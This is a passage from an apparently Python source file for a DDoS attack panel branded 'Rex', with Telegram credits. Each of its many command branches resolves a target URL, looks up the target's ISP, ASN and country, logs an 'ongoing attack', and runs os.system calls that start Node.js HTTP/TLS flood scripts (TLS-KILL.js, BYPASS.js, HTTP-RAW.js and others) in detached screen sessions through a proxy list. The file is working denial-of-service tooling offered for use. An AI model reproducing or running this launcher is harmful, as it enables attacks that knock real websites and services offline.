\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node chaptcha.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "mix" or sinput == "MIX":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'mix',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node mix.js {url} {duration} 24 15')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "tlsv2" or sinput == "TLSV2":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'tlsv2',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node TLSV2.js {url} {duration} 24 15')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "tlsop" or sinput == "TLSOP":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'tlsop',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node tlsop.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "tls-kill" or sinput == "TLS-KILL":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'tls-kill',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node TLS-KILL.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "bypass" or sinput == "BYPASS":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'bypass',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node BYPASS.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "tls" or sinput == "TLS":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'tls',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node TLS.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "http-raw" or sinput == "HTTP-RAW":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'http-raw',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node HTTP-RAW.js {url} {duration}')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "raw" or sinput == "RAW":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'raw',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node RAW.js {url} {duration}')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "rex" or sinput == "REX":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'rex',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node Rex.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "http-vip" or sinput == "HTTP-VIP":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'http-vip',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node HTTP-VIP.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "https" or sinput == "HTTPS":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'https',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node https.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "cat" or sinput == "CAT":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'cat',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ • Rex • ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/Rex\033[31m ]
\033[34m\033[1;37mOWNER:      \033[31m [\033[36m @RexSecPln\033[31m ]
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'screen -dm node Cat.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

login_filename = "login_data.txt"
login_data = read_login_data(login_filename)

if login_data is not None:
    login(login_data)